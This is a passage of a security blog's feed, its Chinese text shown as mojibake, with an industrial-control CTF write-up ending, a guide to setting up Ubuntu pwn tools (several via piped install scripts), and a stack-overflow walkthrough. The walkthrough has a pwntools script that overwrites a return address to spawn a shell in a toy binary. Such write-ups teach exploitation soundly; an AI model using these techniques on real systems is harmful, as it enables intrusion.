´è¯‘å¯†å‡½å†…å®¹çš„å·¥ä½œã€‚è¯¥ç¯èŠ‚è¿˜æœ‰ä¸€ä¸ªéšè—çš„æŠ€æœ¯é—®é¢˜ï¼Œå³ä½¿è·å–äº†å¯†å‡½æ–‡ä»¶é‡Œé¢çš„å†…å®¹ï¼Œè¿˜éœ€è¦çœ‹æ‡‚è¯¥å†…å®¹æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå¦åˆ™ç¬¬å…­å±‚çš„æ”»é˜²å°†æ— ä»å…¥æ‰‹ã€‚</p><p>è¯¥å±‚æ¬¡çš„æ”»å‡»ï¼Œä»æ”»å‡»æŠ€æœ¯è§’åº¦åˆ†æï¼Œæ¯”è¾ƒç®€å•ï¼Œåªè¦é€šè¿‡Modbusç›¸å…³å·¥å…·è¿æ¥å¹¶ç¯¡æ”¹å‚æ•°å³å¯å®ç°äº®èµ·çº¢æ——ï¼Œä½†è¦ä¿æŒé˜Ÿä¼çš„æ——å¸œå¸¸äº®ï¼Œåˆ™å¾ˆè€ƒéªŒæ™ºæ…§ã€‚æ ¹æ®æ¯”èµ›è§„åˆ™ï¼Œè¯¥å±‚æ¬¡æ‰€ä½¿ç”¨çš„ä¸»æœºå’Œäº¤æ¢æœºï¼Œä¸èƒ½ä½œä¸ºæ”»å‡»å¯¹è±¡ï¼Œæ‰€ä»¥æœ‰èƒ½åŠ›çš„é˜Ÿä¼ï¼Œå¯ä»¥å¯¹å…¶ä»–é˜Ÿä¼çš„æ¯”èµ›è®¾å¤‡å‘èµ·æ”»å‡»ï¼Œäº’ç›¸æ”»é˜²ã€‚</p><p>é™„ä»¶ï¼š<a href="https://raw.githubusercontent.com/Qymua/CTF-Writeups/master/2019/ç¦å»ºå·¥æ§æ”»é˜²å¤§èµ›/Competition WriteUp by 2 hours.png" target="_blank" rel="noopener">Competition WriteUp by 2 hours</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;è¿™æ˜¯ä¸€æ¬¡çœå†…é¦–æ¬¡ä¸¾åŠçš„å·¥æ§æ”»é˜²å¤§èµ›ï¼Œèµ›åˆ¶æœ‰åˆ«äºå›½å†…å¾€å±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½ç«èµ›ï¼Œæœ¬è´¨å…¶å®å°±æ˜¯å†…ç½‘æ¸—é€ï¼Œæ”»å‡»ç›®æ ‡é¶æœºå–å¾—æ§åˆ¶æƒå¹¶ç¯¡æ”¹å…¶ç¨‹åº&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Writeup" scheme="http://qymua.com/categories/Writeup/"/>
    
    
      <category term="å·¥æ§" scheme="http://qymua.com/tags/%E5%B7%A5%E6%8E%A7/"/>
    
      <category term="getshell" scheme="http://qymua.com/tags/getshell/"/>
    
      <category term="PLC" scheme="http://qymua.com/tags/PLC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 16.04 for Pwn</title>
    <link href="http://qymua.com/2019/05/23/Ubuntu-16-04-for-Pwn/"/>
    <id>http://qymua.com/2019/05/23/Ubuntu-16-04-for-Pwn/</id>
    <published>2019-05-22T17:02:36.000Z</published>
    <updated>2019-08-10T07:11:58.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å¾€å¾€æˆ‘ä»¬åšpwné¢˜ï¼Œéƒ½æ˜¯æ‹¿åˆ°å¯æ‰§è¡Œæ–‡ä»¶(elf)å…¶ä¾èµ–æ–‡ä»¶libc.so,å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œåˆ©ç”¨å¥½çš„å·¥å…·ï¼Œå¯ä»¥äº‹åŠåŠŸå€ã€‚åœ¨æ­¤åˆ—å‡ºè‡ªå·±åšpwné¢˜çš„è™šæ‹Ÿæœºubuntué…ç½®ï¼Œæ›´åŠ æœŸå¾…WSL2ä¸Šçº¿åï¼Œä½¿ç”¨dockeréƒ¨ç½²pwnç¯å¢ƒåšé¢˜</p></blockquote><p>ä¸»è¦å·¥å…·ï¼š<br><code>vim</code> ï¼š å®‰è£…æ’ä»¶ï¼Œä¸ºåç»­ç¼–å†™exploit<br><code>peda</code> ï¼šgdbæ’ä»¶ï¼Œè°ƒè¯•ç¥å™¨ï¼Œè°ç”¨è°çŸ¥é“<br><code>pwngdbã€gef</code> ï¼šåŒä¸Š<br><code>pwndbg</code>ï¼šGitHubä¸Šçš„ä¸€ä¸ªé¡¹ç›®,ç”¨äºGDBçš„è¾…åŠ©å¢å¼º<br><code>pwntools</code>ï¼šå¸¸è§çš„pwnæ¼æ´å †æº¢å‡ºã€æ ˆæº¢å‡ºã€use after freeã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€å‘½ä»¤æ³¨å…¥ä»¥åŠç«æ€(å¸¸è§äºå¤šçº¿ç¨‹)ç­‰ç¨‹åºæ¼æ´ï¼Œåœ¨ç¨‹åºæ¼æ´åˆ©ç”¨å¸¸åˆ©ç”¨pythonè„šæœ¬æ¥ç¼–å†™exploit<br>Capstoneã€Binutilsâ€¦<br><code>ropå·¥å…·</code> :ROPgadgetã€one_gadgetï¼Œè¿™ä¸¤ä¸ªéƒ½å¾ˆå¥½ç”¨ï¼Œone_gadgetä¸»è¦æ˜¯ç”¨æ¥å¯»æ‰¾libcæ–‡ä»¶ä¸­çš„ä¸€äº›shellåœ°å€çš„ã€ROPgadgetåˆ™ä¸»è¦æ˜¯ç”¨æ¥æ„å»ºropé“¾çš„ï¼Œéå¸¸å®ç”¨<br><code>LibcSearcher</code>:ç”¨æ¥æ³„éœ²libcåº“ä¸­å‡½æ•°çš„åç§»çš„åº“</p><a id="more"></a><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><h3 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- http<span class="variable">s:</span>//raw.github.<span class="keyword">com</span>/ma6174/<span class="keyword">vim</span>/master/setup.<span class="keyword">sh</span> | <span class="keyword">sh</span> -<span class="keyword">x</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/ma6174/vim" target="_blank" rel="noopener">è¯¦ç»†é…ç½®åœ°å€</a></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558516980991.png" alt></p><h3 id="å®‰è£…Capstoneï¼ˆåç¼–è¯‘æ¡†æ¶ï¼‰"><a href="#å®‰è£…Capstoneï¼ˆåç¼–è¯‘æ¡†æ¶ï¼‰" class="headerlink" title="å®‰è£…Capstoneï¼ˆåç¼–è¯‘æ¡†æ¶ï¼‰"></a>å®‰è£…Capstoneï¼ˆåç¼–è¯‘æ¡†æ¶ï¼‰</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~<span class="symbol">$</span> git clone https:<span class="comment">//github.com/aquynh/capstone</span></span><br><span class="line">~<span class="symbol">$</span> cd capstone</span><br><span class="line">~<span class="symbol">$</span> make</span><br><span class="line">~<span class="symbol">$</span> sudo make install</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…Binutilsï¼ˆäºŒè¿›åˆ¶å·¥å…·é›†ï¼‰"><a href="#å®‰è£…Binutilsï¼ˆäºŒè¿›åˆ¶å·¥å…·é›†ï¼‰" class="headerlink" title="å®‰è£…Binutilsï¼ˆäºŒè¿›åˆ¶å·¥å…·é›†ï¼‰"></a>å®‰è£…Binutilsï¼ˆäºŒè¿›åˆ¶å·¥å…·é›†ï¼‰</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/Gallopsled/pwntools-binutils</span><br><span class="line">sudo apt-<span class="built_in">get</span> install software-properties-common</span><br><span class="line">sudo apt-<span class="built_in">add</span>-repository <span class="keyword">pp</span><span class="variable">a:pwntools</span>/binutils</span><br><span class="line">sudo apt-<span class="built_in">get</span> <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install binutils-arm-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ–¹åº“"><a href="#ç¬¬ä¸‰æ–¹åº“" class="headerlink" title="ç¬¬ä¸‰æ–¹åº“"></a>ç¬¬ä¸‰æ–¹åº“</h3><p>åœ¨é€†å‘å’Œæº¢å‡ºç¨‹åºäº¤äº’æ—¶ï¼Œç”¨å¾—æœ€å¤šçš„å‡ ä¸ªç¬¬ä¸‰æ–¹åº“å…ˆè£…å¥½ï¼š<br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo pip <span class="keyword">install</span> pwntools</span><br><span class="line">sudo pip <span class="keyword">install</span> zio</span><br><span class="line">sudo pip <span class="keyword">install</span> pwn</span><br></pre></td></tr></table></figure></p><p>åœ¨é…ç½®python-pipçš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ç‚¹é—®é¢˜<br>å‡çº§pip==19.1.1åï¼Œå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š<br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558514986729.png" alt></p><p>å¯è¡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ä¿®æ”¹æŠ¥é”™è¡Œçš„ä»£ç </p><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pip._internal <span class="keyword">import</span> main</span><br></pre></td></tr></table></figure><p>ssléªŒè¯é—®é¢˜</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ã€€rm -rf /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">dist</span>-<span class="title">packages</span>/<span class="title">OpenSSL</span></span></span><br><span class="line">ã€€rm -rf /usr/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">dist</span>-<span class="title">packages</span>/<span class="title">pyOpenSSL</span>-0.15.1.<span class="title">egg</span>-<span class="title">info</span></span></span><br><span class="line">ã€€sudo pip install pyopenssl</span><br></pre></td></tr></table></figure><p>å‡ºç°checksecæ— æ³•ä½¿ç”¨çš„é—®é¢˜</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install git+http<span class="variable">s:</span>//github.<span class="keyword">com</span>/arthaud/<span class="keyword">python3</span>-pwntools.git</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…gdbå·¥å…·"><a href="#å®‰è£…gdbå·¥å…·" class="headerlink" title="å®‰è£…gdbå·¥å…·"></a>å®‰è£…gdbå·¥å…·</h3><p>åœ¨è°ƒè¯•æ—¶æœ‰æ—¶å€™éœ€è¦ä¸åŒåŠŸèƒ½ï¼Œåœ¨gdbä¸‹éœ€è¦å®‰è£…ä¸¤ä¸ªå·¥å…·pwndbgå’Œpedaï¼Œå¯æƒœè¿™ä¸¤ä¸ªä¸å…¼å®¹</p><p>pwndbgåœ¨è°ƒè¯•å †çš„æ•°æ®ç»“æ„æ—¶å€™å¾ˆæ–¹ä¾¿</p><p>pedaåœ¨æŸ¥æ‰¾å­—ç¬¦ä¸²ç­‰åŠŸèƒ½æ—¶æ–¹ä¾¿</p><h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/longld/peda.git</span> ~<span class="string">/peda</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~<span class="string">/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"DONE! debug your program with gdb and enjoy"</span></span><br></pre></td></tr></table></figure><h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/pwndbg/pwndbg</span><br><span class="line"><span class="keyword">cd</span> pwndbg</span><br><span class="line">./setup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><h4 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~/</span><br><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/scwuaptx/Pwngdb.git </span><br><span class="line"><span class="keyword">cp</span> ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><h4 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#via</span> the install script</span><br><span class="line">$ wget -<span class="selector-tag">q</span> -O- https:<span class="comment">//github.com/hugsy/gef/raw/master/scripts/gef.sh | sh</span></span><br><span class="line">#manually</span><br><span class="line">$ wget -O ~/<span class="selector-class">.gdbinit-gef</span><span class="selector-class">.py</span> -<span class="selector-tag">q</span> https:<span class="comment">//github.com/hugsy/gef/raw/master/gef.py</span></span><br><span class="line">$ echo source ~/<span class="selector-class">.gdbinit-gef</span><span class="selector-class">.py</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹<code>gdbinit</code>æ¥åˆ‡æ¢æƒ³ä½¿ç”¨çš„æ’ä»¶<br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558543947512.png" alt></p><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get <span class="keyword">install</span> ruby</span><br><span class="line">apt-<span class="keyword">get</span> <span class="keyword">install</span> gem</span><br><span class="line">sudo gem <span class="keyword">install</span> one_gadget</span><br></pre></td></tr></table></figure><h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/lieanu/libc.git</span><br><span class="line"><span class="keyword">cd</span> libc</span><br><span class="line">git submodule <span class="keyword">update</span> --init --recursive</span><br><span class="line">sudo <span class="keyword">python</span> setup.<span class="keyword">py</span> develop</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹-Pwnåˆ†æä¹‹æ ˆæº¢å‡º"><a href="#å®ä¾‹-Pwnåˆ†æä¹‹æ ˆæº¢å‡º" class="headerlink" title="å®ä¾‹:Pwnåˆ†æä¹‹æ ˆæº¢å‡º"></a>å®ä¾‹:Pwnåˆ†æä¹‹æ ˆæº¢å‡º</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558346295370.png" alt="è§£é¢˜æ€è·¯"></p><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><h3 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h3><p>åç¼–è¯‘å¾—åˆ°Cä¼ªä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°è°ƒç”¨vulnerable()å‡½æ•°</p><p>vulnerable()å‡½æ•°é€†å‘ç»“æœ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerable()å‡½æ•°ä¸­è°ƒç”¨äº†gets()å’Œputs()å‡½æ•°ï¼Œè€Œç¨‹åºçš„é€»è¾‘åªè¿è¡Œmainå‡½æ•°å’Œvulnerableå‡½æ•°</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558346325757.png" alt="æ‰€æœ‰å‡½æ•°"></p><p>vulnerableå‡½æ•°åŠŸèƒ½ï¼šè¾“å…¥å­—ç¬¦ä¸²ï¼Œè¾“å‡ºå­—ç¬¦ä¸²<br>ç¨‹åºä¸­ä¸»è¦å‡½æ•°æœ‰<br>å†…ç½®å‡½æ•°ï¼š<code>gets</code>ã€<code>puts</code>ã€<code>system</code><br>è‡ªå®šä¹‰å‡½æ•°ï¼š<code>main</code>ã€<code>success</code></p><h3 id="0X02"><a href="#0X02" class="headerlink" title="0X02"></a>0X02</h3><p>é€šè¿‡Cä¼ªä»£ç æœ€ç»ˆå¾—åˆ°çš„Cä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"You Hava already controlled it."</span>);</span><br><span class="line">   system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line"> gets(s);</span><br><span class="line"> <span class="built_in">puts</span>(s);</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"> vulnerable();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>gets() æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå› ä¸ºå®ƒä¸æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œæ˜¯ä»¥å›è½¦æ¥åˆ¤æ–­æ˜¯å¦è¾“å…¥ç»“æŸï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“å¯¼è‡´æ ˆæº¢å‡º</p><h3 id="0X03"><a href="#0X03" class="headerlink" title="0X03"></a>0X03</h3><p>æŸ¥çœ‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558349234163.png" alt="check"></p><p>è¾“å…¥sçš„å€¼æº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œå°†è¿”å›åœ°å€æ›¿æ¢æˆsuccesså‡½æ•°çš„èµ·å§‹åœ°å€</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351987182.png" alt></p><p>EBPä¸EBPçš„è·ç¦»14Hï¼Œè€Œæ ˆä¸­çš„EBPå æ ˆå†…å­˜4Hï¼Œæ‰€ä»¥è¦è¦†ç›–åˆ°æ”¾å›åœ°å€éœ€è¦18H</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351057170.png" alt></p><p>ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process('./Ezreal')</span><br><span class="line">success_addr = 0x080491A2</span><br><span class="line"></span><br><span class="line">payload = 'a' * 0x18 + p32(success_addr)</span><br><span class="line">print p32(success_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è„šæœ¬åçš„æ ˆç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558351356590.png" alt></p><p>è¿è¡Œè„šæœ¬ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1558359406735.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;å¾€å¾€æˆ‘ä»¬åšpwné¢˜ï¼Œéƒ½æ˜¯æ‹¿åˆ°å¯æ‰§è¡Œæ–‡ä»¶(elf)å…¶ä¾èµ–æ–‡ä»¶libc.so,å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œåˆ©ç”¨å¥½çš„å·¥å…·ï¼Œå¯ä»¥äº‹åŠåŠŸå€ã€‚åœ¨æ­¤åˆ—å‡ºè‡ªå·±åšpwné¢˜çš„è™šæ‹Ÿæœºubuntué…ç½®ï¼Œæ›´åŠ æœŸå¾…WSL2ä¸Šçº¿åï¼Œä½¿ç”¨dockeréƒ¨ç½²pwnç¯å¢ƒåšé¢˜&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸»è¦å·¥å…·ï¼š&lt;br&gt;&lt;code&gt;vim&lt;/code&gt; ï¼š å®‰è£…æ’ä»¶ï¼Œä¸ºåç»­ç¼–å†™exploit&lt;br&gt;&lt;code&gt;peda&lt;/code&gt; ï¼šgdbæ’ä»¶ï¼Œè°ƒè¯•ç¥å™¨ï¼Œè°ç”¨è°çŸ¥é“&lt;br&gt;&lt;code&gt;pwngdbã€gef&lt;/code&gt; ï¼šåŒä¸Š&lt;br&gt;&lt;code&gt;pwndbg&lt;/code&gt;ï¼šGitHubä¸Šçš„ä¸€ä¸ªé¡¹ç›®,ç”¨äºGDBçš„è¾…åŠ©å¢å¼º&lt;br&gt;&lt;code&gt;pwntools&lt;/code&gt;ï¼šå¸¸è§çš„pwnæ¼æ´å †æº¢å‡ºã€æ ˆæº¢å‡ºã€use after freeã€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€å‘½ä»¤æ³¨å…¥ä»¥åŠç«æ€(å¸¸è§äºå¤šçº¿ç¨‹)ç­‰ç¨‹åºæ¼æ´ï¼Œåœ¨ç¨‹åºæ¼æ´åˆ©ç”¨å¸¸åˆ©ç”¨pythonè„šæœ¬æ¥ç¼–å†™exploit&lt;br&gt;Capstoneã€Binutilsâ€¦&lt;br&gt;&lt;code&gt;ropå·¥å…·&lt;/code&gt; :ROPgadgetã€one_gadgetï¼Œè¿™ä¸¤ä¸ªéƒ½å¾ˆå¥½ç”¨ï¼Œone_gadgetä¸»è¦æ˜¯ç”¨æ¥å¯»æ‰¾libcæ–‡ä»¶ä¸­çš„ä¸€äº›shellåœ°å€çš„ã€ROPgadgetåˆ™ä¸»è¦æ˜¯ç”¨æ¥æ„å»ºropé“¾çš„ï¼Œéå¸¸å®ç”¨&lt;br&gt;&lt;code&gt;LibcSearcher&lt;/code&gt;:ç”¨æ¥æ³„éœ²libcåº“ä¸­å‡½æ•°çš„åç§»çš„åº“&lt;/p&gt;
    
    </summary>
    
      <category term="Pwn" scheme="http://qymua.com/categories/Pwn/"/>
    
    
      <category term="ubuntu" scheme="http://qymua.com/tags/ubuntu/"/>
    
      <category term="linux" scheme="http://qymua.com/tags/linux/"/>
    
      <category term="pwn" scheme="http://qymua.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Git for github ä½¿ç”¨ç¬”è®°</title>
    <link href="http://qymua.com/2019/04/24/Git-for-github-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://qymua.com/2019/04/24/Git-for-github-ä½¿ç”¨ç¬”è®°/</id>
    <published>2019-04-24T09:51:52.000Z</published>
    <updated>2019-08-10T13:03:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ä½œä¸ºä¸€ä¸ªç™½å¸½å­ï¼Œä½¿ç”¨githubçš„å”¯ä¸€ç›®çš„æ˜¯è®°å½•è‡ªå·±çš„ç ”ç©¶é¡¹ç›®ï¼Œå­˜æ”¾å­¦ä¹ ç¬”è®°ï¼Œå¤‡ä»½èµ„æ–™ç­‰ç­‰ã€‚å¯¹ååŒå¼€å‘çš„éœ€æ±‚ä¸å¤§ï¼Œç®€å•ä½¿ç”¨Gitçš„å‡ ä¸ªå‘½ä»¤å°±å¯ä»¥ä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œå¾ˆå¤šäººè¯´å¾ˆç¹çï¼Œå–œæ¬¢ä½¿ç”¨GUIç‰ˆæœ¬çš„github for Desktop,é‚£ä¹ˆè¿™å°±çœ‹ä¸ªäººå–œå¥½äº†~æ¥ä¸‹æ¥çš„å†…å®¹ä»…é€‚åˆåŒæˆ‘æƒ…å†µå·®ä¸å¤šçš„äººé˜…è¯»! </p></blockquote><p>è¯¦ç»†çš„å­¦ä¹ æ•™ç¨‹â€“&gt;<a href="http://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">èœé¸Ÿæ•™ç¨‹ for Git</a> </p><a id="more"></a><h2 id="Gitå’Œgithubçš„å…³ç³»"><a href="#Gitå’Œgithubçš„å…³ç³»" class="headerlink" title="Gitå’Œgithubçš„å…³ç³»"></a>Gitå’Œgithubçš„å…³ç³»</h2><p><code>git</code>: æ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼ˆVersion controlï¼‰,å®ƒå¯åœ¨æœ¬åœ°å»ºç«‹ä»“åº“,ä½ å†™çš„ä»£ç çš„å„ä¸ªç‰ˆæœ¬éƒ½å¯ä»¥å­˜ç€ ;</p><p><code>github</code>: æ˜¯ä¸€ä¸ªé¢å‘å¼€æºåŠç§æœ‰è½¯ä»¶é¡¹ç›®çš„æ‰˜ç®¡å¹³å°ï¼Œç›¸å½“äºç½‘ä¸Šä»“åº“,ä½ å†™çš„ä»£ç çš„å„ä¸ªç‰ˆæœ¬éƒ½å¯ä»¥å­˜ç€;</p><p><code>å†å²æ¸Šæº</code>ï¼šGitæ¯”GitHubå‡ºç”Ÿçš„æ—©ã€‚äº‹ä»¶å›åˆ°2005å¹´ï¼Œæœ‰ä¸ªå…¬å¸ä¸å…è®¸linuxç³»ç»Ÿç»§ç»­å…è´¹ä½¿ç”¨å®ƒä»¬çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶äº†ï¼Œç„¶ålinuxç³»ç»Ÿåˆ›å§‹äººTorvaldsä¸€æ°”ä¹‹ä¸‹èŠ±äº†10å¤©æ—¶é—´åˆ›é€ 